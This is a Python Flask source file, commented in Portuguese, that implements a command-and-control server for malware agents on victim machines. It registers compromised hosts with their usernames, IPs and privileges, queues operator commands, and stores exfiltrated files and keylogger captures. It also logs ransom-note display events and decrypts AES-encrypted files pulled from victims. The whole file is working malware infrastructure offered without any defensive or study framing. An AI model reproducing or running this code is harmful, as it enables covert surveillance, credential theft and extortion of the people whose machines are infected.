from flask import Flask, request, jsonify, render_template
from datetime import datetime, timedelta
import uuid
import json
import os
import base64

# --- PLATFORM-SPECIFIC IMPORTS ---
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
except ImportError:
    AES = None

# Inicializa o servidor Flask
app = Flask(__name__, template_folder='templates')

# --- ESTRUTURAS DE DADOS E PERSISTÊNCIA ---
AGENTS_DB_FILE = "agents_db.json"
DOWNLOADS_DIR = "C2_Downloads"
KEYLOGS_DIR = "C2_Keylogs"
SYSTEM_LOGS_DIR = "C2_System_Logs"
OPERATOR_LOG_FILE = "c2_operator_log.txt"
agents = {} 
tasks = {} 

AGENT_TIMEOUT_SECONDS = 60

def setup_directories():
    os.makedirs(DOWNLOADS_DIR, exist_ok=True)
    os.makedirs(KEYLOGS_DIR, exist_ok=True)
    os.makedirs(SYSTEM_LOGS_DIR, exist_ok=True)

def save_agents_to_disk():
    with open(AGENTS_DB_FILE, 'w') as f:
        json.dump(agents, f, indent=4)

def load_agents_from_disk():
    global agents
    if os.path.exists(AGENTS_DB_FILE) and os.path.getsize(AGENTS_DB_FILE) > 0:
        try:
            with open(AGENTS_DB_FILE, 'r') as f:
                agents = json.load(f)
                print(f"[+] {len(agents)} agentes carregados do banco de dados.")
        except:
            agents = {}
    else:
        agents = {}

def log_operator_action(agent_id, command, args):
    with open(OPERATOR_LOG_FILE, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] AGENT_ID: {agent_id} | COMMAND: {command} | ARGS: {json.dumps(args)}\n"
        f.write(log_entry)

def log_system_event(agent_id, event_type, message):
    log_file = os.path.join(SYSTEM_LOGS_DIR, f"{agent_id}_system.log")
    with open(log_file, 'a', encoding='utf-8') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{event_type.upper()}] {str(message)}\n"
        f.write(log_entry)

# --- ROTAS DA APLICAÇÃO ---

@app.route('/')
def home():
    return render_template('index.html')

# --- API PARA AGENTES E DEMAIS FUNÇÕES ---
@app.route('/register', methods=['POST'])
def register_agent():
    data = request.json
    agent_id = str(uuid.uuid4())
    agents[agent_id] = {
        "username": data.get("username"), "hostname": data.get("hostname"),
        "internal_ip": data.get("internal_ip", "N/A"),
        "external_ip": data.get("external_ip", "N/A"),
        "os_name": data.get("os_name"),
        "privileges": data.get("privileges", "Desconhecido"),
        "agent_version": data.get("agent_version", ""),
        "first_seen": datetime.now().isoformat(), "last_seen": datetime.now().isoformat()
    }
    tasks[agent_id] = []
    log_system_event(agent_id, "REGISTER", f"Novo agente registrado. Versão: {agents[agent_id]['agent_version']}")
    save_agents_to_disk()
    print(f"[+] Novo agente registrado ({data.get('privileges')}): {data.get('hostname')} ({agent_id})")
    return jsonify({"agent_id": agent_id})

@app.route('/issue_command', methods=['POST'])
def issue_command():
    data = request.json
    agent_id = data.get('agent_id'); command = data.get('command'); args = data.get('args', "")
    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
    log_operator_action(agent_id, command, args)
    task_id = str(uuid.uuid4())
    task = {"task_id": task_id, "command": command, "args": args, "status": "Pendente", "timestamp_issued": datetime.now().isoformat(), "result": None}
    tasks.setdefault(agent_id, []).append(task)
    return jsonify({"status": "Comando enfileirado", "task_id": task_id})

@app.route('/get_task/<agent_id>', methods=['GET'])
def get_task(agent_id):
    if agent_id not in agents: return jsonify({"error": "Agente não registrado"}), 404
    agents[agent_id]['last_seen'] = datetime.now().isoformat()
    save_agents_to_disk()
    for task in tasks.get(agent_id, []):
        if task['status'] == 'Pendente':
            task['status'] = 'Executando'
            return jsonify({"task_id": task['task_id'], "command": task['command'], "args": task['args']})
    return jsonify({"command": "sleep", "args": "5"})

@app.route('/task_result', methods=['POST'])
def post_result():
    data = request.json
    agent_id = data.get('agent_id'); task_id = data.get('task_id')
    if agent_id not in agents: return jsonify({"error": "Agente não registrado"}), 404
    data_type = data.get('data_type', 'generic_result'); result_data = data.get('result')
    task_found = False
    for task in tasks.get(agent_id, []):
        if task['task_id'] == task_id:
            task['status'] = 'Concluído' if data_type != 'error' else 'Erro'
            task['result'] = result_data
            task_found = True
            log_system_event(agent_id, task['status'].upper(), f"Comando '{task['command']}' finalizado.")
            break
    if not task_found: log_system_event(agent_id, "WARNING", f"Recebido resultado para uma tarefa desconhecida: {task_id}")
    if data_type == 'error': log_system_event(agent_id, "ERROR", result_data)
    elif data_type in ['info', 'keylogger_started', 'keylogger_stopped', 'upload_success', 'ransom_note_displayed']: log_system_event(agent_id, "INFO", result_data)
    if data_type == 'file_download':
        try:
            file_content = base64.b64decode(result_data['content_b64'])
            agent_dir = os.path.join(DOWNLOADS_DIR, agent_id); os.makedirs(agent_dir, exist_ok=True)
            file_path = os.path.join(agent_dir, result_data['filename'])
            with open(file_path, 'wb') as f: f.write(file_content)
            result_data = f"Arquivo '{result_data['filename']}' salvo em: {file_path}"
            data_type = 'download_success'
        except Exception as e:
            result_data = f"Erro ao salvar arquivo baixado: {e}"
            log_system_event(agent_id, "ERROR", result_data)
    elif data_type == 'keylogger_data':
        try:
            keylog_file = os.path.join(KEYLOGS_DIR, f"{agent_id}_keylog.txt")
            with open(keylog_file, 'a', encoding='utf-8') as f: f.write(result_data)
            return jsonify({"status": "keylog received"})
        except Exception as e:
            log_system_event(agent_id, "ERROR", f"Falha ao salvar keylog: {e}")
            return jsonify({"status": "error"})
    result_entry = {"task_id": task_id, "timestamp": datetime.now().isoformat(), "data_type": data_type, "data": result_data}
    filename = f"agent_{agent_id}_results.json"
    try:
        with open(filename, 'r') as f: all_results = json.load(f)
    except: all_results = []
    all_results.append(result_entry)
    with open(filename, 'w') as f: json.dump(all_results, f, indent=4)
    return jsonify({"status": "success"})

@app.route('/get_tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
    return jsonify(tasks.get(agent_id, []))
@app.route('/get_system_logs/<agent_id>', methods=['GET'])
def get_system_logs(agent_id):
    if agent_id not in agents: return "Agente não encontrado.", 404
    try:
        log_file = os.path.join(SYSTEM_LOGS_DIR, f"{agent_id}_system.log")
        with open(log_file, 'r', encoding='utf-8') as f: return f.read()
    except FileNotFoundError: return "Nenhum log de sistema para este agente.", 404
    except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
@app.route('/delete_agents', methods=['POST'])
def delete_agents():
    global agents
    data = request.json
    agent_ids_to_delete = data.get('agent_ids', [])
    if not agent_ids_to_delete: return jsonify({"status": "noop", "message": "Nenhum ID de agente fornecido."})
    deleted_count = 0
    for agent_id in agent_ids_to_delete:
        if agent_id in agents:
            try: os.remove(f"agent_{agent_id}_results.json")
            except FileNotFoundError: pass
            try: os.remove(os.path.join(KEYLOGS_DIR, f"{agent_id}_keylog.txt"))
            except FileNotFoundError: pass
            try: os.remove(os.path.join(SYSTEM_LOGS_DIR, f"{agent_id}_system.log"))
            except FileNotFoundError: pass
            del agents[agent_id]
            if agent_id in tasks: del tasks[agent_id]
            deleted_count += 1
    save_agents_to_disk()
    log_operator_action("SYSTEM", "delete_selected", {"deleted_ids": agent_ids_to_delete})
    return jsonify({"status": "success", "deleted_count": deleted_count})
@app.route('/get_keylogs/<agent_id>', methods=['GET'])
def get_keylogs(agent_id):
    if agent_id not in agents: return "Agente não encontrado.", 404
    try:
        keylog_file = os.path.join(KEYLOGS_DIR, f"{agent_id}_keylog.txt")
        with open(keylog_file, 'r', encoding='utf-8') as f: return f.read()
    except FileNotFoundError: return "Nenhum log capturado para este agente ainda.", 404
    except Exception as e: return f"Erro ao ler arquivo de log: {e}", 500
@app.route('/get_agents', methods=['GET'])
def get_agents():
    now = datetime.now(); agents_with_status = {}
    for agent_id, agent_data in agents.items():
        last_seen_dt = datetime.fromisoformat(agent_data['last_seen'])
        if now - last_seen_dt < timedelta(seconds=AGENT_TIMEOUT_SECONDS): agent_data['status'] = 'online'
        else: agent_data['status'] = 'offline'
        agents_with_status[agent_id] = agent_data
    return jsonify(agents_with_status)
@app.route('/get_results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
    filename = f"agent_{agent_id}_results.json"
    try:
        with open(filename, 'r') as f: all_results = json.load(f)
    except: all_results = []
    return jsonify({"results": all_results})
@app.route('/list_downloads/<agent_id>', methods=['GET'])
def list_downloads(agent_id):
    if agent_id not in agents: return jsonify({"error": "Agente não encontrado"}), 404
    agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
    if not os.path.isdir(agent_download_dir): return jsonify([])
    files = [f for f in os.listdir(agent_download_dir) if os.path.isfile(os.path.join(agent_download_dir, f))]
    return jsonify(files)
@app.route('/decrypt_file', methods=['POST'])
def decrypt_file_route():
    if not AES: return jsonify({"status": "error", "message": "Biblioteca de criptografia não está instalada no servidor."}), 500
    data = request.json
    agent_id = data.get('agent_id'); filename = data.get('filename'); key_b64 = data.get('key_b64')
    if not all([agent_id, filename, key_b64]): return jsonify({"status": "error", "message": "Dados incompletos."}), 400
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return jsonify({"status": "error", "message": "Chave inválida."}), 400
    except: return jsonify({"status": "error", "message": "Chave Base64 inválida."}), 400
    file_path = os.path.join(DOWNLOADS_DIR, agent_id, filename)
    if not os.path.exists(file_path): return jsonify({"status": "error", "message": "Arquivo não encontrado no servidor."}), 404
    try:
        with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        decrypted_path = file_path.replace('.encrypted', '.decrypted')
        with open(decrypted_path, 'wb') as f_out: f_out.write(original_data)
        return jsonify({"status": "success", "message": f"Arquivo salvo como {os.path.basename(decrypted_path)}"})
    except Exception as e: return jsonify({"status": "error", "message": f"Falha na descriptografia: {e}"}), 500

if __name__ == '__main__':
    setup_directories()
    load_agents_from_disk()
    app.run(host='0.0.0.0', port=8000, debug=True)
